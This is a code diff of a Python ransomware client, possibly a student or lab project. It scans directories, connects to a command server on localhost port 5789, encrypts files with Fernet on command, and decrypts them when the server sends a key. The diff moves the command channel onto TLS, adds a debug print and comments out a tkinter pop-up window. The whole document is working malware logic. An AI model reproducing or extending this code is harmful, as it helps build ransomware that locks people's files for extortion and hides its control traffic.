@@ -1,14 +1,17 @@
+from email import message
 import os
 from pathlib import Path
 from cryptography.fernet import Fernet
 import socket
 import select
+import ssl
 import sys
 from threading import *
 import uuid
 import time
 
-import interface
+#import interface
+
 
 '''
     Function to recursively scan a directory and give a list of filepaths
@@ -123,20 +126,23 @@ if __name__ == "__main__":
     HOST = 'localhost'
     PORT = 5789
 
+    context = ssl.create_default_context()
+
     # set up our socket to connect to the server
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((HOST, PORT))
+    s = socket.create_connection((HOST, PORT))
+    secSock = context.wrap_socket(s, server_hostname=HOST)
     print('Connected!')
-    s.send(bytes(MESSAGE, "utf-8"))
+    print(bytes(MESSAGE, "utf-8"))
+    secSock.send(bytes(MESSAGE, "utf-8"))
 
     while True:
-        read_sockets, write_sockets, error_sockets = select.select([s], [], [])
+        read_sockets, write_sockets, error_sockets = select.select([secSock], [], [])
 
         # key = encrypt
         # wait = decrypt
         for sock in read_sockets:
-            if sock == s:
-                data = s.recv(4096)
+            if sock == secSock:
+                data = secSock.recv(4096)
                 if not data:
                     sys.exit()
                 
@@ -152,12 +158,12 @@ if __name__ == "__main__":
                         encryptFiles(key)
                     
                     # set up thread for tkinter window
-                    t1 = Thread(target=interface.App().pop_up_win)
-                    t1.daemon = True
-                    t1.start()
+                    #t1 = Thread(target=interface.App().pop_up_win)
+                    #t1.daemon = True
+                    #t1.start()
 
                     # recv waits for new input of key to decrypt
-                    key = s.recv(4096)
+                    key = secSock.recv(4096)
                     # upon receiving a key from the server, proceed to decrypt files
                     decryptFiles(key.decode())
 
